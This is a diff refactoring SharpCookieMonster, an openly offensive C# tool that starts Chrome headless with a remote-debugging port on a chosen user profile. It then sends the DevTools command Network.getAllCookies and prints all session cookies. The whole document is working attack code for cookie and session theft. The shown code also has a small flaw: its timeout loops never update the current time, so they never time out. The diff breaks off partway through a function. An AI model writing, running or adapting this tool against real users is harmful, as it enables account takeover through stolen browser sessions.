@@ -1,18 +1,17 @@
 ﻿using System;
 using System.Diagnostics;
-using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Text.RegularExpressions;
 using System.Threading;
 using WebSocket4Net;
+using DataReceivedEventArgs = System.Diagnostics.DataReceivedEventArgs;
 
 namespace SharpCookieMonster
 {
-    class Program
+    public static class Program
     {
-
-        private static string banner = @"
+        private const string BANNER = @"
                                                                               
                                                                                 
                                                                                 
@@ -45,13 +44,14 @@ namespace SharpCookieMonster
                           ,*, ,@@@@@@@@&&&&@@%/, ..                             
                                                                                 
                                                                               ";
-        static void Main(string[] args)
+
+        private static void Main(string[] args)
         {
-            Console.WriteLine(banner);
+            Console.WriteLine(BANNER);
             Console.WriteLine("                     SharpCookieMonster v1.0 by @m0rv4i\n");
             if (args.Length == 1 && (args[0] == "-h" || args[0] == "--help"))
             {
-                Console.WriteLine("[*] SharpCookieMonster.exe [url] [chrome-debugging-port] [userdatadir]");
+                Console.WriteLine("[*] SharpCookieMonster.exe [url] [chrome-debugging-port] [user-data-dir]");
                 return;
             }
             var url = "https://www.google.com";
@@ -72,24 +72,22 @@ namespace SharpCookieMonster
                 userdata = args[2];
             }
             Console.WriteLine("[*] Using data path: " + userdata);
-            var pid = LaunchChromeHeadless(url, userdata, port);
-            if (pid < 0)
+            var chrome = LaunchChromeHeadless(url, userdata, port);
+            if (chrome == null)
             {
                 // Ain't running - no point in continuing
                 return;
             }
-            var cookies = "";
+            string cookies;
             try
             {
-
                 cookies = GrabCookies(port);
-
             }
             finally
             {
-                Cleanup(pid);
+                Cleanup(chrome);
             }
-            if (String.IsNullOrEmpty(cookies))
+            if (string.IsNullOrEmpty(cookies))
             {
                 Console.WriteLine("[-] No response or could not connect");
             }
@@ -100,7 +98,7 @@ namespace SharpCookieMonster
             else
             {
                 Console.WriteLine("[+] Cookies! OM NOM NOM\n\n");
-                string pretty = cookies.Trim();
+                var pretty = cookies.Trim();
                 pretty = pretty.Replace("{\"id\":1,\"result\":{\"cookies\":", "");
                 pretty = pretty.Replace("}]}}", "}]");
                 pretty = pretty.Replace(",", ",\n");
@@ -108,17 +106,22 @@ namespace SharpCookieMonster
                 pretty = pretty.Replace("}]", "\n}\n]\n");
                 pretty = pretty.Replace("{", " \n{\n");
                 pretty = pretty.Replace("\n\"", "\n\t\"");
-                pretty = pretty.Substring(0, pretty.LastIndexOf("]") + 1);
+                pretty = pretty.Substring(0, pretty.LastIndexOf("]", StringComparison.Ordinal) + 1);
                 Console.WriteLine(pretty);
             }
         }
 
-        private static int LaunchChromeHeadless(string url, string userdata, int port)
+        private static void LogData(object sender, DataReceivedEventArgs args)
         {
-            using (Process chrome = new Process())
+            Console.WriteLine("[*][Chrome] {0}", args.Data);
+        }
+
+        private static Process LaunchChromeHeadless(string url, string userdata, int port)
+        {
+            using (var chrome = new Process())
             {
                 var chromes = Process.GetProcessesByName("chrome");
-                var path = @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe";
+                var path = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
                 if (chromes.Length == 0)
                 {
                     Console.WriteLine("[*] No chrome processes running, defaulting binary path to: " + path);
@@ -126,37 +129,25 @@ namespace SharpCookieMonster
                 else
                 {
                     // Get the filepath of a running chrome process
-                    path = chromes[0].MainModule.FileName;
+                    path = chromes[0].MainModule?.FileName;
                 }
                 chrome.StartInfo.UseShellExecute = false;
                 chrome.StartInfo.FileName = path;
-                chrome.StartInfo.Arguments = String.Format("\"{0}\" --headless --user-data-dir=\"{1}\" --remote-debugging-port={2}", url, userdata, port);
+                chrome.StartInfo.Arguments = $"\"{url}\" --headless --user-data-dir=\"{userdata}\" --remote-debugging-port={port}";
                 chrome.StartInfo.CreateNoWindow = true;
-                chrome.OutputDataReceived += (sender, args) => Console.WriteLine("[*][Chrome] {0}", args.Data);
-                chrome.ErrorDataReceived += (sender, args) => Console.WriteLine("[-][Chrome] {0}", args.Data);
+                chrome.OutputDataReceived += LogData;
+                chrome.ErrorDataReceived += LogData;
                 chrome.StartInfo.RedirectStandardOutput = true;
                 chrome.StartInfo.RedirectStandardError = true;
                 chrome.Start();
                 chrome.BeginOutputReadLine();
                 chrome.BeginErrorReadLine();
-                int pid = chrome.Id;
+                var pid = chrome.Id;
                 Thread.Sleep(1000);
                 Console.WriteLine("[*] Started chrome headless process: " + pid);
-                try
-                {
-                    Process.GetProcessById(pid);
-                }
-                catch (ArgumentException)
-                {
-                    Console.WriteLine("[-] Launched chrome process is not running...will try connecting to port anyway");
-                    pid = 0;
-                }
-                if (!WaitForPort(port))
-                {
-                    Console.WriteLine("[-] Timed out waiting for debug port to open...");
-                    return -1;
-                }
-                return pid;
+                if (WaitForPort(port)) return chrome;
+                Console.WriteLine("[-] Timed out waiting for debug port to open...");
+                return null;
             }
 
         }
@@ -166,8 +157,8 @@ namespace SharpCookieMonster
             using (var webClient = new WebClient())
             {
 
-                var regex = new Regex(String.Format("\"webSocketDebuggerUrl\":\\s*\"(ws://localhost:{0}/.*)\"", port));
-                var response = webClient.DownloadString(String.Format("http://localhost:{0}/json", port));
+                var regex = new Regex($"\"webSocketDebuggerUrl\":\\s*\"(ws://localhost:{port}/.*)\"");
+                var response = webClient.DownloadString($"http://localhost:{port}/json");
                 var match = regex.Match(response);
                 if (!match.Success)
                 {
@@ -175,7 +166,7 @@ namespace SharpCookieMonster
                     return null;
                 }
                 var debugUrl = match.Groups[1].Value;
-                var cookiesRequest = "{\"id\": 1, \"method\": \"Network.getAllCookies\"}";
+                const string cookiesRequest = "{\"id\": 1, \"method\": \"Network.getAllCookies\"}";
                 Console.WriteLine("[*] Retrieved debug url: " + debugUrl);
                 return WebSocketRequest35(debugUrl, cookiesRequest);
             }
@@ -183,59 +174,59 @@ namespace SharpCookieMonster
         }
 
 
-        private static void Cleanup(int pid)
+        private static void Cleanup(Process chrome)
         {
             try
             {
-                if (pid != 0)
-                {
-                    Console.WriteLine("[*] Killing process " + pid);
-                    Process.GetProcessById(pid).Kill();
-                }
+                if (chrome == null) return;
+                chrome.ErrorDataReceived -= LogData;
+                chrome.OutputDataReceived -= LogData;
+                Console.WriteLine("[*] Killing process " + chrome.Id);
+                chrome.Kill();
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error killing chrome process with pid {0}: {1}", pid, e);
+                Console.WriteLine("[-] Error killing chrome process with pid {0}: {1}", chrome?.Id, e);
             }
         }
 
 
-        public static string WebSocketRequest35(string server, string data)
+        private static string WebSocketRequest35(string server, string data)
         {
-            string result = "";
-            bool datareceived = false;
-            WebSocket websocket = new WebSocket(server);
-            websocket.MessageReceived += new EventHandler<MessageReceivedEventArgs>(websocket_MessageReceived);
-            websocket.Opened += new EventHandler(websocket_Opened);
+            var result = "";
+            var dataReceived = false;
+            var websocket = new WebSocket(server);
+            websocket.MessageReceived += WebsocketMessageReceived;
+            websocket.Opened += WebsocketOpened;
             websocket.Open();
             var start = DateTime.Now;
             var now = DateTime.Now;
-            while (!datareceived && now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
+            while (!dataReceived && now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
             {
                 Thread.Sleep(500);
             }
             return result;
 
-            void websocket_Opened(object sender, EventArgs e)
+            void WebsocketOpened(object sender, EventArgs e)
             {
                 websocket.Send(data);
             }
 
-            void websocket_MessageReceived(object sender, MessageReceivedEventArgs e)
+            void WebsocketMessageReceived(object sender, MessageReceivedEventArgs e)
             {
                 result += e.Message;
-                datareceived = true;
+                dataReceived = true;
             }
         }
 
         private static bool WaitForPort(int port)
         {
-            Console.WriteLine(String.Format("[*] Waiting for debugger port {0} to open...", port));
+            Console.WriteLine($"[*] Waiting for debugger port {port} to open...");
             var start = DateTime.Now;
             var now = DateTime.Now;
             while (now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
             {
-                using (TcpClient tcpClient = new TcpClient())
+                using (var tcpClient = new TcpClient())
                 {
                     try
                     {
